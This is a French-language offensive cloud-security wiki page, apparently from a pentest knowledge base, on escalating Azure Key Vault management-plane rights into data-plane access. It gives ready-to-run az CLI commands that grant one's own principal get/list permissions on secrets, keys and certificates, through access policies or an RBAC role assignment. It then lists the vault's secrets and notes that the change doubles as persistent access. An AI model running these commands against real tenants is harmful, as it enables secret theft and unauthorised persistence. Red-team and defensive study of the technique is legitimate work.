---
title: "Stratégie d'accès : s'octroyer l'accès au coffre"
order: 3
description: "S'octroyer l'accès au coffre en écrivant une stratégie d'accès ou un rôle RBAC Key Vault pour atteindre ses secrets et ses clés."
keywords:
  - Key Vault
  - stratégie d'accès
  - octroi RBAC
  - permissions du coffre
  - escalade de privilèges
---

# Stratégie d'accès

Lire un coffre nécessite un accès au **plan de données**, mais un principal ne détient souvent que des droits de **plan de gestion** sur le coffre (Contributor, ou un rôle personnalisé avec `Microsoft.KeyVault/vaults/write`). Cela suffit : vous octroyez à votre propre principal un accès au plan de données, puis lisez tout.

## S'octroyer l'accès (coffres à stratégies d'accès)

```bash
az keyvault set-policy --name <vault> \
  --object-id <your-object-id> \
  --secret-permissions get list --key-permissions get list --certificate-permissions get list
# then dump as normal
az keyvault secret list --vault-name <vault>
```

## S'octroyer l'accès (coffres RBAC)

```bash
# newer vaults use Azure RBAC; assign yourself a data-plane role at the vault scope
az role assignment create --assignee <your-object-id> \
  --role "Key Vault Secrets User" \
  --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>
```

## Notes d'exploitation

- C'est une escalade de privilèges du plan de gestion vers le plan de données ; elle laisse un changement de stratégie d'accès ou d'attribution de rôle qui subsiste jusqu'à ce qu'il soit remarqué, ce qui constitue aussi un accès durable.
- Nécessiter `Microsoft.KeyVault/vaults/write` (set-policy) ou `Microsoft.Authorization/roleAssignments/write` (RBAC) fait de cela une escalade d'[identité](../../identity/privilege-escalation/index.md) qui se trouve viser un coffre.
- Sur les coffres RBAC, `set-policy` n'a aucun effet ; confirmez d'abord le modèle de permissions du coffre avec `az keyvault show --query properties.enableRbacAuthorization`.

## Outils

- **az cli** (`keyvault set-policy`, `role assignment create`).
- **MicroBurst** / **BARK** pour repérer les coffres accessibles depuis un principal contrôlé.

## Références

- [Microsoft : RBAC Key Vault vs stratégies d'accès](https://learn.microsoft.com/azure/key-vault/general/rbac-guide)
- [HackTricks Cloud : privesc Azure Key Vault](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [SpecterOps : BARK](https://github.com/BloodHoundAD/BARK)
